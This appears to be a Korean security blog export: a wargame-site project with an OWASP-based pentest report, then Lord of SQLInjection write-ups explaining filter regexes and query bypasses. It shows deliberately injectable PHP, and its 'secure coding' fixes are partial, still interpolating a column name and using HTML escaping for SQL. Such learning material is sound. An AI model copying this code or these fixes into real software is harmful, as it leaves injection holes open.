<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$passwd</span> = <span class="string">&#x27;flag&#123;StrCmP_f1a9&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>]))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error!!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>)&amp;&amp;(strcmp(<span class="variable">$passwd</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])==<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$passwd</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;login failed!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php</span></span><br><span class="line"><span class="string">if(!isset(\$_GET[&#x27;id&#x27;])) || !isset(\$_GET[&#x27;pw&#x27;]))</span></span><br><span class="line"><span class="string">        echo &#x27;error!!&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if((\$_GET[&#x27;id&#x27;] == &#x27;admin&#x27;)&amp;&amp;(strcmp(\$passwd, \$_GET[&#x27;pw&#x27;])==0))</span></span><br><span class="line"><span class="string">        echo \$passwd;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">        echo &#x27;login failed!!!&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> highlight_string(<span class="variable">$code</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="📰-게시판-제작-및-기능-구현"><a href="#📰-게시판-제작-및-기능-구현" class="headerlink" title="📰 게시판 제작 및 기능 구현"></a>📰 게시판 제작 및 기능 구현</h1><br>

<h2 id="메인-페이지-1"><a href="#메인-페이지-1" class="headerlink" title="메인 페이지"></a>메인 페이지</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_main.png" width="70%" heigth="70%">

<br>

<div class="note default"><p>메인 페이지입니다. 최근에 올라온 게시물이 보이고 포인트 랭킹이 있습니다.</p>
</div>

<br>

<br>

<h2 id="회원가입-amp-로그인-1"><a href="#회원가입-amp-로그인-1" class="headerlink" title="회원가입 &amp; 로그인"></a>회원가입 &amp; 로그인</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_register.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_login.png"></div></div></div></p>
<br>

<div class="note default"><p>회원가입 페이지와 로그인 페이지입니다.</p>
<p>워게임 사이트와 별도로 회원가입을 해야합니다.</p>
<p>회원가입 페이지에는 <code>아이디</code> 중복확인 버튼이 있고 <code>패스워드</code>를 입력하는 입력란이 있습니다.</p>
<p>로그인 페이지에는 <code>아이디</code>, <code>패스워드</code> 입력란이 있습니다.</p>
</div>

<br>

<br>

<h2 id="쪽지-페이지"><a href="#쪽지-페이지" class="headerlink" title="쪽지 페이지"></a>쪽지 페이지</h2><p><br><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_note.png"></div><div class="group-picture-column"><img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_note_2.png"></div></div></div></p>
<br>

<div class="note default"><p>쪽지 송수신 페이지입니다..</p>
<p>유저 간 쪽지를 주고 받는 기능이 있습니다.</p>
</div>

<br>

<br>

<h2 id="게시글-작성-페이지"><a href="#게시글-작성-페이지" class="headerlink" title="게시글 작성 페이지"></a>게시글 작성 페이지</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_write.png" width="70%" heigth="70%">

<br>

<div class="note default"><p>게시글 작성 페이지 입니다.</p>
<p>자유게시판과 Q&amp;A 게시판을 선택할 수 있으며 파일을 업로드 할 수 있습니다.</p>
</div>

<br>

<br>

<h2 id="게시글-리스트"><a href="#게시글-리스트" class="headerlink" title="게시글 리스트"></a>게시글 리스트</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/board_list.png" width="70%" heigth="70%">

<br>

<div class="note default"><p>게시판에 쓴 글이 보이는 페이지입니다.</p>
</div>

<br>

<br>

<hr>
<br>

<h1 id="💉-게시판-모의해킹-및-보고서-작성"><a href="#💉-게시판-모의해킹-및-보고서-작성" class="headerlink" title="💉 게시판 모의해킹 및 보고서 작성"></a>💉 게시판 모의해킹 및 보고서 작성</h1><br>

<p>팀원 별로 각자 보고서를 작성하여 서로 공유하고 부족한 부분을 채워 하나의 보고서를 완성했습니다.</p>
<p>보고서는 <code>OWASP TOP 10</code> 기반으로 작성하였습니다.</p>
<br>

<br>

<h2 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_contents.png">

<br>

<p>보고서의 <code>목차</code> 부분입니다. </p>
<p><code>개요</code>, <code>수행 절차</code>, <code>모의해킹 세부 분석</code>, <code>대응방안</code>, <code>시큐어 코딩</code>, <code>참고 자료</code> 로 나눠져 있습니다.</p>
<br>

<br>

<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_2.png">

<br>

<p>보고서의 <code>개요</code> 부분입니다. 본 모의해킹의 설명이 적혀있습니다.</p>
<p><code>취약점 요약</code>에는 본 사이트에서 나온 취약점을 모아놓았습니다. 어떤 취약점이 있는지 한번에 볼 수 있습니다.</p>
<p><code>대상</code>에는 본 모의해킹의 대상에 대해 설명이 적혀있습니다.</p>
<br>

<br>

<h2 id="수행-절차"><a href="#수행-절차" class="headerlink" title="수행 절차"></a>수행 절차</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_3.png">

<br>

<p>보고서의 <code>수행 절차</code> 부분입니다. </p>
<p><code>점검 방법</code>에는 본 모의해킹의 수행 절차를 설명해놓은 표가 있습니다.</p>
<p><code>점검 할 취약점 항목</code>에는 취약점 항목에 대한 설명이 있습니다. OWSASP TOP 10 기반으로 모의해킹을 하기 때문에 OWASP TOP 10의 항목과 설명을 적어놓은 표가 있습니다.</p>
<br>

<br>

<h2 id="모의해킹-세부-분석"><a href="#모의해킹-세부-분석" class="headerlink" title="모의해킹 세부 분석"></a>모의해킹 세부 분석</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_4.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_5.png">

<br>

<p>모의해킹 세부 분석의 <code>정보수집</code> 부분입니다.</p>
<p><code>nikto</code>, <code>Nmap</code>, <code>Wafw00f</code>를 이용하여 <code>정보수집</code>을 하였습니다.</p>
<p><code>정보수집</code> 결과를 표로 정리해놨습니다.</p>
<br>

<br>

<p><code>세부 분석</code>과 <code>대응 방법</code>은 내용이 많아 <code>A1</code>부분만 적었습니다.</p>
<br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_6.png">

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_7.png">

<br>

<p><code>A1 Injection</code> 입니다. 모의해킹 대상 페이지의 <code>url</code>을 적어놨습니다.</p>
<p>또한 모의해킹 과정(SQL Injection)을 작성했습니다.</p>
<br>

<br>

<h2 id="대응방안"><a href="#대응방안" class="headerlink" title="대응방안"></a>대응방안</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_8.png">

<br>

<p>해당 취약점의 <code>대응방안</code>을 정리해놨습니다.</p>
<br>

<br>

<h2 id="시큐어-코딩"><a href="#시큐어-코딩" class="headerlink" title="시큐어 코딩"></a>시큐어 코딩</h2><br>

<img src="/images/프로젝트/Wargame 사이트 제작 및 모의해킹 진단 후 보고서 작성/report_9.png">

<br>

<p>대상 페이지의 <code>url</code>과 <code>기존 소스코드</code>와 <code>시큐어 코딩이</code> 적용된 코드와 설명이 있습니다.</p>
<br>

<br>

<h3 id="A1-Injection"><a href="#A1-Injection" class="headerlink" title="A1 Injection"></a>A1 Injection</h3><br>

<div class="note danger"><p><strong>기존 소스코드 (시큐어 코딩 X)</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#search_result.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$catagory</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;catgo&#x27;</span>];</span><br><span class="line"><span class="variable">$search_con</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;search&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from board where <span class="subst">$catagory</span> like &#x27;%<span class="subst">$search_con</span>%&#x27; order by num desc&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<div class="note success"><p><strong>시큐어 코딩 소스코드</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#search_result.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$catagory</span> = mysqli_real_escape_string(<span class="variable">$con</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;catgo&#x27;</span>]);</span><br><span class="line"><span class="variable">$search_con</span> = mysqli_real_escape_string(<span class="variable">$con</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;search&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from board where <span class="subst">$catagory</span> like &#x27;%<span class="subst">$search_con</span>%&#x27; order by num desc&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>



<p><code>mysqli_real_escape_string</code> 함수를 사용하여 시큐어 코딩을 해주었습니다.</p>
<p><code>mysqli_real_escape_string</code> 함수는 <code>&#39;</code>, <code>&quot;</code>, <code>\x00</code>, <code>\n</code>, <code>\r</code>, <code>\</code>, <code>\x1a</code> 와 같은 문자 앞에 <code>\</code> 를 붙여서 해당 문자가 실제 작동하지 않도록 이스케이프 해주었습니다.</p>
</div>

<br>

<br>

<h3 id="A7-Cross-Site-Scripting-XXS"><a href="#A7-Cross-Site-Scripting-XXS" class="headerlink" title="A7 Cross-Site Scripting (XXS)"></a>A7 Cross-Site Scripting (XXS)</h3><br>

<div class="note danger"><p><strong>기존 소스코드 (시큐어 코딩 X)</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#board_modify.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_POST</span>[<span class="string">&quot;subject&quot;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update board set subject=&#x27;<span class="subst">$subject</span>&#x27;, content=&#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot; where num=<span class="subst">$num</span>&quot;</span>;</span><br><span class="line">mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<div class="note success"><p><strong>시큐어 코딩 소스코드</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#board_modify.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = <span class="variable">$_POST</span>[<span class="string">&quot;subject&quot;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$subject</span> = htmlspecialchars(<span class="variable">$subject</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$content</span> = htmlspecialchars(<span class="variable">$content</span>, ENT_QUOTES);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update board set subject=&#x27;<span class="subst">$subject</span>&#x27;, content=&#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> .= <span class="string">&quot; where num=<span class="subst">$num</span>&quot;</span>;</span><br><span class="line">mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<br>

<div class="note danger"><p><strong>기존 소스코드 (시큐어 코딩 X)</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#reply_ok.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_name&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_id&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$no</span> &amp;&amp; <span class="variable">$name</span> &amp;&amp; <span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;insert into reply(con_num,name,id,content) values (<span class="subst">$no</span>, &#x27; </span></span><br><span class="line"><span class="string"><span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$id</span>&#x27;,&#x27;<span class="subst">$content</span>&#x27;);&quot;</span>;</span><br><span class="line"> mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
</div>

<br>

<div class="note success"><p><strong>시큐어 코딩 소스코드</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#reply_ok.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_name&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;reply_id&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$no</span> = htmlspecialchars(<span class="variable">$no</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$name</span> = htmlspecialchars(<span class="variable">$name</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$id</span> = htmlspecialchars(<span class="variable">$id</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$content</span> = htmlspecialchars(<span class="variable">$content</span>, ENT_QUOTES);</span><br><span class="line"><span class="variable">$page</span> = htmlspecialchars(<span class="variable">$page</span>, ENT_QUOTES);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$no</span> &amp;&amp; <span class="variable">$name</span> &amp;&amp; <span class="variable">$id</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;insert into reply(con_num,name,id,content) values (<span class="subst">$no</span>, &#x27; </span></span><br><span class="line"><span class="string"><span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$id</span>&#x27;,&#x27;<span class="subst">$content</span>&#x27;);&quot;</span>;</span><br><span class="line"> mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>



<p><code>htmlspecialchars</code> 함수는 사용자가 입력한 문자열에서 특정한 특수 문자를 HTML 엔티티로 변환해주는 PHP 함수입니다.</p>
<p>크로스 사이트 스크립팅(XSS) 취약점을 방지하기 위해 사용되며, 사용자가 입력한 문자열 중 <code>&#39;</code>, <code>&quot;</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code> 문자를 HTML 엔티티 문자로 변환합니다.</p>
</div>

<br>

<br>

]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [1번_gremlin] Write UP</title>
    <url>/2021/09/15/2021-09-15-Lord_of_SQLInjection_1_gremlin/</url>
    <content><![CDATA[<h1 id="📖-전체-소스코드"><a href="#📖-전체-소스코드" class="headerlink" title="📖 전체 소스코드"></a>📖 전체 소스코드</h1><br>

<p>1번 문제인 gremlin을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/gremlin/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>));</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) solve(<span class="string">&quot;gremlin&quot;</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="✅-중요-소스코드-해석"><a href="#✅-중요-소스코드-해석" class="headerlink" title="✅ 중요 소스코드 해석"></a>✅ 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">// do not try to attack another table, database!</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>일단 <code>조건문</code>과 밑에 <code>query문</code>이 보입니다. </p>
<br>

<hr>
<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//id 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<br>

<img src="/images/Lord of SQLInjection/gremlin/preg.png">

<br>

<br>

<hr>
<h2 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h2><p>첫번째 줄과 마찬가지로 필터링 하는 것을 확인할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//pw 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<hr>
<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><p>세번째 줄은 쿼리문입니다.</p>
<p><code>id</code>와 <code>pw</code> 둘 중 하나를 참으로 만들어주면 해당 쿼리문을 우회할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_gremlin where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="🏁-SOLVE"><a href="#🏁-SOLVE" class="headerlink" title="🏁 SOLVE"></a>🏁 SOLVE</h1><br>

<p><code>id</code> 부분에 아무 문자를 넣고 <code>pw</code> 부분을 참으로 만들었습니다.<br><br><br></p>
<img src = "/images/Lord of SQLInjection/gremlin/solved.png">
<br><br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [2번_cobolt] Write UP</title>
    <url>/2021/09/16/2021-09-16-Lord_of_SQLInjection_2_cobolt/</url>
    <content><![CDATA[<h1 id="📕-전체-소스코드"><a href="#📕-전체-소스코드" class="headerlink" title="📕 전체 소스코드"></a>📕 전체 소스코드</h1><br>

<p>2번 문제인 cobolt을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/cobolt/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  <span class="variable">$db</span> = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br><span class="line">  <span class="keyword">elseif</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[&#x27;id&#x27;]&#125;</span>&lt;br&gt;You are not admin :(&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h1 id="❕❕-중요-소스코드-해석"><a href="#❕❕-중요-소스코드-해석" class="headerlink" title="❕❕ 중요 소스코드 해석"></a>❕❕ 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_cobolt where id=&#x27;<span class="subst">&#123;$_GET[id]&#125;</span>&#x27; and pw=md5(&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;)&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;cobolt&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>1번 문제와 같이 <code>조건문</code>과 밑에 <code>query문</code>이 보입니다. </p>
<p>또한 <code>id</code> 파라미터가 <code>admin</code> 이어야 하는 <code>조건문</code>도 있습니다.</p>
<br>

<hr>
<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[id])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//id 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<br>

<img src="/images/Lord of SQLInjection/cobolt/preg.png">

<br>

<br>

<hr>
<h2 id="두번째-줄-해석"><a href="#두번째-줄-해석" class="headerlink" title="두번째 줄 해석"></a>두번째 줄 해석</h2><p>첫번째 줄과 마찬가지로 필터링 하는 것을 확인할 수 있습니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); <span class="comment">//pw 파라미터에서 필터링 중</span></span><br></pre></td></tr></table></figure>
<p><br><br></p>
<hr>
<h2 id="세번째-줄-해석"><a href="#세번째-줄-해석" class="headerlink" title="세번째 줄 해석"></a>세번째 줄 해석</h2><p>세번째 줄은 쿼리문입니다.</p>
<p><code>id</code>를 <code>admin</code>으로 만들어주는 동시에 참으로 만들어주면 해당 쿼리문을 우회할 수 있습니다.</p>
